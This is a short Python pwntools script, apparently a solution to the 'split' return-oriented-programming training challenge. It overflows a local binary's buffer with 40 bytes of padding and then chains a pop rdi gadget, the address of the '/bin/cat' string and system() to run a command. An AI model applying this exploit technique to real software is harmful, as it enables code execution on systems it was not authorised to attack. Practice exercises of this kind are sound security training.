from pwn import *

p = process("./split")

exe = './split'
elf = context.binary = ELF(exe,checksec=False)
context.log_level = 'debug'

payload = b"a"*40
payload += p64(0x000000000040053e)
payload += p64(0x00000000004007c3) #pop_rdi
payload += p64(next(elf.search(b'/bin/cat'))) #bincat
payload += p64(elf.symbols['system']) #system
#payload += p64(0x0000000000400742)

p.sendline(payload)
p.interactive()
